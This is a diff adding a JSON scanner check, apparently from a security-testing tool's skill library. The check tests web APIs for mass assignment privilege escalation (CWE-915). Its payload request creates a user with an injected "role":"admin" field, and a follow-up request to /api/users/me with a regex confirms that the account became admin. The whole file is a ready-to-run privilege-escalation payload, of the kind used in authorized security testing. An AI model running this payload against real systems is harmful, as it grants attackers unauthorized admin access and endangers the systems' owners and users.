@@ -1,0 +1,39 @@
+{
+  "name": "web/Mass assignment role escalation",
+  "description": "[mid] Mass assignment privilege escalation (CWE-915; OWASP API6:2019): binding the extra 'role' field on create/update flips the stored principal to admin — the me/ profile object proves it stuck. Keywords: mass assignment role admin escalation binding api privilege. ctrl: benign create without the extra field stays role=user -> not falsified. base_url = API root (copy skill to rename fields per framework).",
+  "cwe": "CWE-915",
+  "requests": {
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/api/users",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": "{\"email\":\"x9f@corp.example\",\"name\":\"x9f\",\"role\":\"admin\"}"
+    },
+    "check": {
+      "method": "GET",
+      "url": "{{base_url}}/api/users/me"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 201
+    },
+    {
+      "type": "body_regex",
+      "request": "check",
+      "pattern": "\"role\"\\s*:\\s*\"admin\""
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "d156a09a86f6",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
